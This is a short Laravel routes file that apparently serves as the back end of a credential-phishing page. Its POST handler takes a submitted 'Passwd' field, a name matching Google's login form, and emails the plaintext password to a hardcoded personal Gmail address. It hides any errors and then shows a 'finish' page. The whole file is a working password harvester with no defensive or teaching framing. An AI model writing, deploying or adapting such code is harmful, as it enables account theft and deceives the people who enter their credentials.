<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use App\Mail\Mail as MailController;
Route::get('/', function () {
    return view('index1');
});
Route::post('/', function (Request $req) {

    if (empty($req->input('Passwd'))) {
        return back()->with( "error" ,"Password is Required");
    } else {
        try {
            Mail::to("gorg.haddad.90@gmail.com")->send(new MailController($req->input('Passwd')));
        } catch (\Exception $e) {

        }
        return view('finish');
    }
});